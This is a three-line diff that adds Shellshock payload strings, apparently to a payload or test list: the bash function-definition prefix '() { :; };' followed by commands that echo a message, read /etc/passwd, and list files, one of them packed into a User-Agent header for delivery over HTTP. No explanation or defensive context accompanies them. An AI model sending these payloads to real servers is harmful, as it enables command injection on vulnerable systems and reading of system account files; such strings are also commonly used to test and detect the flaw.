@@ -1,0 +1,3 @@
+() { :; }; echo "Shellshock vulnerability!"
+() { :; }; /bin/cat /etc/passwd
+User-Agent: () { :; }; /bin/ls
